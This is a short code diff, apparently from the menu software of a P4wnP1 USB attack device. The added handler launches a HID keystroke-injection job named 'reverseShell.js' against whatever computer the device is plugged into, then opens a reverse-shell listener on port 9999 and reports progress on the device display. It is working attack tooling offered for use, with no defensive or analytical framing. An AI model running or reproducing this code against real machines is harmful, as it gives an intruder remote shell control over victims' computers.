@@ -2143,11 +2143,18 @@ while 1:
             #industrial section
             if (page == 63):
                 if cursor == 1:
-                    Popen(['nohup','reverseShellListener.listen("0.0.0.0",9999)'],preexec_fn=os.setpgrp) 
-                if cursor == 1:
-                    page = 63
-                if cursor == 7:
-                    update()
+                    # run as background job P4wnP1_cli hid job command
+                    DisplayText("","","","Starting script ","","","")
+                    cmd = "P4wnP1_cli hid job 'reverseShell.js'"
+                    result=execcmd(cmd)
+                    if(result==-1):
+                      displayError()
+                    DisplayText("","","","Starting listner ","","","")
+                    reverseShellListener.listen("0.0.0.0",9999)
+                    #Popen(['nohup','reverseShellListener.listen("0.0.0.0",9999)'],preexec_fn=os.setpgrp) 
+                    #Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'],preexec_fn=os.setpgrp)
+                    DisplayText("","","","Listener terminated ","","","")
+                    time.sleep(5)			
 
             if page == 0:
             #we are in main menu
